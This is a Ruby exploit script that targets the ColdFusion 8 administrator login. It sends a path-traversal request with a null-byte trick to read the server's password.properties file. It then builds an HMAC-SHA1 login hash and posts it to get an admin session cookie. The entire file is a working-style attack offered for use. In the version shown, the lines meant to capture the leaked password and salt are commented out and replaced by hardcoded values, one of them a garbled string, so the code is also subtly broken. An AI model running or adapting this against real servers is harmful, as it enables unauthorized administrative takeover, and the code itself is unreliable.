 
#!/usr/bin/ruby
 
require 'net/http'
require 'net/https'
require 'openssl'
 
def usage
    puts "usage: ./cf8_autopwn.rb host port"
end
 
if not ARGV.length == 2
    usage
    exit(1)
end
 
server = ARGV[0]
port = ARGV[1].to_i
 
http = Net::HTTP.new(server, port)
if port == 443 then http.use_ssl = true end
 
# replace local with text file containing drtrv strings
# or ill stop being lazy and rewrite this to iterate through all options
# until we get a hit
path = '/CFIDE/administrator/enter.cfm'
locale = 'locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'
headers = {
    'Host' => server,
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Content-Length' => locale.length.to_s,
}
 
resp, data = http.post(path, locale, headers)
data =~ /\<title\>.*password=([A-F0-9]+).*\<\/title\>/m
#password = $1
password = 'AAFDC23870ECBCD3D557B6423A8982134E17927E'
data =~ /\<input name="salt" type="hidden" value="(\d+)"\>/
 
#salt = $1
salt = "8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n"
hash = OpenSSL::HMAC.hexdigest('sha1',salt, password)
 
logindata = "cfadminPassword=#{hash.upcase}&requestedURL=%2FCFIDE%2Fadministrator%2Fenter.cfm%3F"
logindata += "&salt=#{salt}&submit=Login"
loginheaders = {
    'Host' => server,
}
 
resp, data = http.post(path, logindata, loginheaders)
puts resp['set-cookie']
